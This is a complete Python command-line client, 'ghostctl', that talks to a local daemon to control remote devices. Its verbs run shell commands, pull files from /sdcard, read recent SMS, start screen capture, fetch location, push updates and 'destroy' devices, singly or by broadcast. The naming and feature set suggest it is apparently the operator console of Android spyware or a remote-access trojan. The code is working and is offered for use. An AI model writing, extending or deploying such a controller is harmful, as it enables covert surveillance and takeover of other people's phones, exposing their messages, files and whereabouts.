#!/usr/bin/env python3
"""ghostctl CLI — talks to the daemon admin port (default 127.0.0.1:8444).

Usage:
  ghostctl.py list | status | devices
  ghostctl.py -d <device_id> shell "echo hi"
  ghostctl.py -d <device_id> files ls /sdcard
  ghostctl.py -d <device_id> files get /sdcard/x.jpg
  ghostctl.py -d <device_id> sms recent [N]
  ghostctl.py -d <device_id> screen start|stop
  ghostctl.py -d <device_id> loc once
  ghostctl.py -d <device_id> update
  ghostctl.py -d <device_id> destroy
  ghostctl.py --all update          # broadcast

JSON output by default; --pretty for humans.
Env: GHOSTCTL_ADMIN_HOST / GHOSTCTL_ADMIN_PORT (default 127.0.0.1:8444).
"""
import argparse
import json
import os
import socket
import sys

ADMIN_HOST = os.environ.get("GHOSTCTL_ADMIN_HOST", "127.0.0.1")
ADMIN_PORT = int(os.environ.get("GHOSTCTL_ADMIN_PORT", "8444"))


def rpc(req):
    with socket.create_connection((ADMIN_HOST, ADMIN_PORT), timeout=15) as s:
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
    return json.loads(buf)


def emit(data, pretty):
    if pretty:
        print(json.dumps(data, indent=2, sort_keys=True))
    else:
        print(json.dumps(data))


# verb -> (action, arity handler). args validated by argparse, translated here.
def build_args(ns):
    verb = ns.verb
    if verb == "shell":
        return "shell", [" ".join(ns.rest)]
    if verb == "files":
        if ns.rest[0] not in ("ls", "get"):
            sys.exit("files: expected 'ls [path]' or 'get <path>'")
        return "files", ns.rest
    if verb == "sms":
        if not ns.rest or ns.rest[0] != "recent":
            sys.exit("sms: expected 'recent [N]'")
        return "sms", ns.rest
    if verb == "screen":
        if not ns.rest or ns.rest[0] not in ("start", "stop"):
            sys.exit("screen: expected 'start' or 'stop'")
        return "screen", ns.rest
    if verb == "loc":
        if not ns.rest or ns.rest[0] != "once":
            sys.exit("loc: expected 'once'")
        return "loc", ns.rest
    if verb in ("update", "destroy"):
        return verb, []
    sys.exit(f"unknown verb {verb}")


def main():
    p = argparse.ArgumentParser(prog="ghostctl", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-d", "--device", help="target device_id")
    p.add_argument("--all", action="store_true", help="broadcast to all devices")
    p.add_argument("--pretty", action="store_true", help="human-readable output")
    p.add_argument("--wait", type=float, default=10.0, help="seconds to wait for result")
    p.add_argument("verb", help="list|status|devices|shell|files|sms|screen|loc|update|destroy")
    p.add_argument("rest", nargs="*", help="verb arguments")
    ns = p.parse_args()

    if ns.verb in ("list", "status", "devices"):
        emit(rpc({"op": "list"}), ns.pretty)
        return

    action, args = build_args(ns)
    if not ns.all and not ns.device:
        sys.exit("specify -d <device_id> or --all")
    resp = rpc({"op": "command", "all": ns.all, "device_id": ns.device,
                "action": action, "args": args, "wait": ns.wait})
    emit(resp, ns.pretty)
    if not resp.get("ok"):
        sys.exit(1)


if __name__ == "__main__":
    main()
